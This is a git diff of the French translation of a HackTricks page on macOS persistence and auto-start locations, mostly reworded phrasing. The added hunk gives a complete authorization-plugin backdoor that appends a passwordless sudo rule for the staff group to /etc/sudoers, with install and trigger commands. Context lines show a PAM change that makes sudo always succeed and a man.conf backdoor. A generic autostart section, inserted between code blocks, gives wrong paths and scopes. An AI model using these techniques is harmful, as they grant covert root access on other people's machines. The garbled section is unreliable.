@@ -4,8 +4,8 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
-* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
@@ -17,7 +17,7 @@ Cette section est largement basée sur la série de blogs [**Au-delà des bons v
 ## Contournement de la sandbox
 
 {% hint style="success" %}
-Ici, vous pouvez trouver des emplacements de démarrage utiles pour **contourner la sandbox** qui vous permettent simplement d'exécuter quelque chose en **l'écrivant dans un fichier** et en **attendant** une **action** très **courante**, une **durée déterminée** ou une **action que vous pouvez généralement effectuer** depuis l'intérieur d'une sandbox sans avoir besoin de privilèges root.
+Ici, vous pouvez trouver des emplacements de démarrage utiles pour **contourner la sandbox** qui vous permettent d'exécuter simplement quelque chose en **l'écrivant dans un fichier** et en **attendant** une **action** très **courante**, une **durée déterminée** ou une **action que vous pouvez généralement effectuer** depuis l'intérieur d'une sandbox sans avoir besoin de privilèges root.
 {% endhint %}
 
 ### Launchd
@@ -77,7 +77,7 @@ La **principale différence entre les agents et les daemons est que les agents s
 </dict>
 </plist>
 ```
-Il existe des cas où un **agent doit être exécuté avant la connexion de l'utilisateur**, on les appelle des **PreLoginAgents**. Par exemple, cela est utile pour fournir une technologie d'assistance lors de la connexion. Ils peuvent également être trouvés dans `/Library/LaunchAgents` (voir [**ici**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) un exemple).
+Il y a des cas où un **agent doit être exécuté avant la connexion de l'utilisateur**, on les appelle des **PreLoginAgents**. Par exemple, cela est utile pour fournir une technologie d'assistance lors de la connexion. Ils peuvent également être trouvés dans `/Library/LaunchAgents` (voir [**ici**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) un exemple).
 
 {% hint style="info" %}
 Les nouveaux fichiers de configuration des démons ou des agents seront **chargés après le prochain redémarrage ou en utilisant** `launchctl load <target.plist>`. Il est **également possible de charger des fichiers .plist sans cette extension** avec `launchctl -F <file>` (cependant, ces fichiers plist ne seront pas automatiquement chargés après le redémarrage).\
@@ -133,7 +133,7 @@ echo "touch /tmp/hacktricks" >> ~/.zshrc
 ### Applications réouvertes
 
 {% hint style="danger" %}
-La configuration de l'exploitation indiquée et la déconnexion et la reconnexion, voire le redémarrage, n'ont pas fonctionné pour moi pour exécuter l'application. (L'application ne s'exécutait pas, peut-être qu'elle doit être en cours d'exécution lorsque ces actions sont effectuées)
+La configuration de l'exploitation indiquée et la déconnexion et la reconnexion ou même le redémarrage n'ont pas fonctionné pour moi pour exécuter l'application. (L'application ne s'exécutait pas, peut-être qu'elle doit être en cours d'exécution lorsque ces actions sont effectuées)
 {% endhint %}
 
 **Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)
@@ -151,7 +151,7 @@ Toutes les applications à réouvrir se trouvent dans le plist `~/Library/Prefer
 
 Ainsi, pour que les applications réouvertes lancent votre propre application, vous devez simplement **ajouter votre application à la liste**.
 
-L'UUID peut être trouvé en listant ce répertoire ou avec `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`
+L'UUID peut être trouvé en répertoriant ce répertoire ou avec `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`
 
 Pour vérifier les applications qui seront réouvertes, vous pouvez exécuter :
 ```bash
@@ -359,19 +359,19 @@ Ici, vous pouvez trouver des emplacements de démarrage utiles pour contourner l
 
 **Writeup**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)
 
-* Utile pour contourner la sandbox: [✅](https://emojipedia.org/check-mark-button)
+* Utile pour contourner la sandbox : [✅](https://emojipedia.org/check-mark-button)
 * Cependant, vous devez être capable d'exécuter le binaire `crontab`
 * Ou être root
 
 #### Emplacement
 
 * **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
-* Accès en écriture directe nécessitant les droits root. Aucun accès root requis si vous pouvez exécuter `crontab <fichier>`
-* **Déclencheur**: Dépend de la tâche cron
+* Accès en écriture directe nécessitant les droits root. Aucun droit root requis si vous pouvez exécuter `crontab <fichier>`
+* **Déclencheur** : Dépend de la tâche cron
 
 #### Description et exploitation
 
-Listez les tâches cron de l'**utilisateur actuel** avec:
+Listez les tâches cron de l'**utilisateur actuel** avec :
 ```bash
 crontab -l
 ```
@@ -417,39 +417,49 @@ chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
 ```
 # Emplacements de démarrage automatique de macOS
 
-macOS offre plusieurs emplacements où vous pouvez configurer des applications pour qu'elles se lancent automatiquement au démarrage du système. Cela peut être pratique pour les applications que vous utilisez fréquemment et que vous souhaitez avoir immédiatement disponibles dès que vous allumez votre Mac.
+macOS offre plusieurs emplacements où vous pouvez configurer des applications pour qu'elles se lancent automatiquement au démarrage du système. Cela peut être pratique pour les applications que vous utilisez fréquemment et que vous souhaitez avoir immédiatement disponibles.
 
-Voici les emplacements de démarrage automatique les plus courants sur macOS :
+Voici les emplacements courants où vous pouvez trouver des applications configurées pour le démarrage automatique :
 
 ## Dossier de démarrage
 
-Le dossier de démarrage est l'emplacement le plus courant pour configurer les applications de démarrage automatique. Les applications placées dans ce dossier se lancent automatiquement chaque fois que vous ouvrez une session sur votre Mac. Le chemin d'accès au dossier de démarrage est le suivant :
+Le dossier de démarrage est situé dans le répertoire personnel de chaque utilisateur. Les applications placées dans ce dossier se lanceront automatiquement lors de l'ouverture de session de l'utilisateur correspondant.
 
-```
-~/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.ApplicationRecentDocuments/
-```
+Chemin : `~/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.ApplicationRecentDocuments`
 
 ## Préférences système
 
-Les préférences système de macOS offrent également une option pour configurer les applications de démarrage automatique. Vous pouvez accéder à cette option en ouvrant les préférences système, en sélectionnant "Utilisateurs et groupes", puis en cliquant sur l'onglet "Ouverture". Vous verrez une liste des applications configurées pour se lancer au démarrage et vous pourrez ajouter ou supprimer des applications de cette liste.
+Les préférences système de macOS permettent de configurer les applications qui se lancent automatiquement au démarrage pour tous les utilisateurs du système.
 
-## LaunchAgents et LaunchDaemons
+Chemin : `~/Library/Preferences/com.apple.loginitems.plist`
 
-Les LaunchAgents et LaunchDaemons sont des mécanismes plus avancés pour configurer les applications de démarrage automatique sur macOS. Ils utilisent des fichiers de configuration au format XML pour spécifier quelles applications doivent être lancées au démarrage. Les fichiers LaunchAgents sont spécifiques à un utilisateur, tandis que les fichiers LaunchDaemons sont utilisés pour lancer des applications au niveau du système. Les fichiers de configuration pour ces mécanismes sont généralement situés dans les répertoires suivants :
+## Préférences de lancement
 
-```
-~/Library/LaunchAgents/
-/Library/LaunchAgents/
-/Library/LaunchDaemons/
-```
+Les préférences de lancement sont des fichiers de configuration spécifiques à chaque application. Ils permettent de définir si une application doit se lancer automatiquement au démarrage.
 
-## Login Items
+Chemin : `~/Library/Preferences`
 
-Les Login Items sont une autre option pour configurer les applications de démarrage automatique sur macOS. Vous pouvez accéder à cette option en ouvrant les préférences système, en sélectionnant "Utilisateurs et groupes", puis en cliquant sur l'onglet "Ouverture". Vous verrez une liste des applications configurées pour se lancer au démarrage et vous pourrez ajouter ou supprimer des applications de cette liste.
+## LaunchAgents
+
+Les LaunchAgents sont des fichiers de configuration au format XML qui permettent de spécifier les applications qui doivent se lancer automatiquement au démarrage. Ils sont généralement utilisés par les applications tierces.
+
+Chemin : `/Library/LaunchAgents` et `~/Library/LaunchAgents`
+
+## LaunchDaemons
+
+Les LaunchDaemons sont similaires aux LaunchAgents, mais ils sont exécutés au niveau du système plutôt qu'au niveau de l'utilisateur. Ils sont généralement utilisés pour les services système.
+
+Chemin : `/Library/LaunchDaemons` et `/System/Library/LaunchDaemons`
+
+## Extensions de noyau
+
+Les extensions de noyau peuvent également être configurées pour se charger automatiquement au démarrage du système. Cependant, cela nécessite des privilèges d'administration et est généralement réservé aux développeurs et aux administrateurs système.
+
+Chemin : `/Library/Extensions` et `/System/Library/Extensions`
 
 ## Conclusion
 
-La connaissance des emplacements de démarrage automatique de macOS est essentielle pour comprendre comment les applications sont configurées pour se lancer automatiquement. En comprenant ces emplacements, vous pouvez mieux contrôler les applications qui se lancent au démarrage de votre Mac et améliorer la sécurité et les performances de votre système.
+Il est important de connaître ces emplacements de démarrage automatique de macOS afin de pouvoir vérifier et contrôler les applications qui se lancent automatiquement au démarrage du système. Cela peut contribuer à renforcer la sécurité et les performances de votre système.
 ```bash
 cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
 #!/usr/bin/env python3
@@ -470,11 +480,11 @@ Le script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** ser
 ```bash
 do shell script "touch /tmp/iterm2-autolaunchscpt"
 ```
-Les préférences iTerm2 se trouvent dans **`~/Library/Preferences/com.googlecode.iterm2.plist`** et peuvent **indiquer une commande à exécuter** lorsque le terminal iTerm2 est ouvert.
+Les préférences d'iTerm2 se trouvent dans **`~/Library/Preferences/com.googlecode.iterm2.plist`** et peuvent **indiquer une commande à exécuter** lorsque le terminal iTerm2 est ouvert.
 
-Ce paramètre peut être configuré dans les paramètres iTerm2 :
+Ce paramètre peut être configuré dans les paramètres d'iTerm2 :
 
-<figure><img src="../.gitbook/assets/image (2) (1).png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>
 
 Et la commande est reflétée dans les préférences :
 ```bash
@@ -773,7 +783,7 @@ mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
 ```
 Ensuite, ouvrez l'application `Folder Actions Setup`, sélectionnez le **dossier que vous souhaitez surveiller** et sélectionnez dans votre cas **`folder.scpt`** (dans mon cas, je l'ai appelé output2.scp):
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>
 
 Maintenant, si vous ouvrez ce dossier avec **Finder**, votre script sera exécuté.
 
@@ -967,7 +977,7 @@ Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://p
 * `~/Library/Screen Savers`
 * **Déclencheur** : Sélectionnez l'économiseur d'écran
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>
 
 #### Description & Exploit
 
@@ -1269,7 +1279,7 @@ account    required       pam_permit.so
 password   required       pam_deny.so
 session    required       pam_permit.so
 ```
-Et donc toute tentative d'utilisation de **`sudo` fonctionnera**.
+Et donc toute tentative d'utiliser **`sudo` fonctionnera**.
 
 {% hint style="danger" %}
 Notez que ce répertoire est protégé par TCC, il est donc très probable que l'utilisateur reçoive une demande d'accès.
@@ -1291,11 +1301,53 @@ Writeup : [https://posts.specterops.io/persistent-credential-theft-with-authoriz
 
 #### Description et exploitation
 
-Vous pouvez créer un plugin d'autorisation qui sera exécuté lorsque l'utilisateur se connecte pour maintenir la persistance. Pour plus d'informations sur la création de ces plugins, consultez les writeups précédents (et faites attention, un plugin mal écrit peut vous bloquer et vous devrez nettoyer votre Mac en mode de récupération).
+Vous pouvez créer un plugin d'autorisation qui sera exécuté lorsque l'utilisateur se connecte pour maintenir la persistance. Pour plus d'informations sur la création de ces plugins, consultez les writeups précédents (et soyez prudent, un plugin mal écrit peut vous bloquer et vous devrez nettoyer votre Mac en mode de récupération).
+```objectivec
+// Compile the code and create a real bundle
+// gcc -bundle -framework Foundation main.m -o CustomAuth
+// mkdir -p CustomAuth.bundle/Contents/MacOS
+// mv CustomAuth CustomAuth.bundle/Contents/MacOS/
+
+#import <Foundation/Foundation.h>
+
+__attribute__((constructor)) static void run()
+{
+NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
+system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
+}
+```
+**Déplacez** le bundle à l'emplacement à charger:
+```bash
+cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
+```
+Enfin, ajoutez la **règle** pour charger ce Plugin :
+```bash
+cat > /tmp/rule.plist <<EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+<key>class</key>
+<string>evaluate-mechanisms</string>
+<key>mechanisms</key>
+<array>
+<string>CustomAuth:login,privileged</string>
+</array>
+</dict>
+</plist>
+EOF
+
+security authorizationdb write com.asdf.asdf < /tmp/rule.plist
+```
+Déclenchez-le avec:
+```bash
+security authorize com.asdf.asdf
+```
+Et ensuite, le groupe **staff devrait avoir un accès sudo** (lire `/etc/sudoers` pour confirmer).
 
 ### Man.conf
 
-Writeup : [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)
+Writeup: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)
 
 * Utile pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
 * Mais vous devez être root et l'utilisateur doit utiliser man
@@ -1306,9 +1358,9 @@ Writeup : [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit
 * Nécessite les droits root
 * **`/private/etc/man.conf`** : Chaque fois que man est utilisé
 
-#### Description et exploitation
+#### Description et Exploit
 
-Le fichier de configuration **`/private/etc/man.conf`** indique le binaire/script à utiliser lors de l'ouverture des fichiers de documentation man. Ainsi, le chemin vers l'exécutable peut être modifié de sorte que chaque fois que l'utilisateur utilise man pour lire des documents, une porte dérobée est exécutée.
+Le fichier de configuration **`/private/etc/man.conf`** indique le binaire/script à utiliser lors de l'ouverture des fichiers de documentation man. Ainsi, le chemin vers l'exécutable peut être modifié de sorte qu'à chaque fois que l'utilisateur utilise man pour lire des documents, une porte dérobée est exécutée.
 
 Par exemple, définissez dans **`/private/etc/man.conf`** :
 ```
@@ -1332,8 +1384,8 @@ touch /tmp/manconf
 #### Emplacement
 
 * **`/etc/apache2/httpd.conf`**
-* Nécessite les droits root
-* Déclencheur: lorsque Apache2 démarre
+* Nécessite les privilèges root
+* Déclenchement: lorsque Apache2 démarre
 
 #### Description et Exploit
 
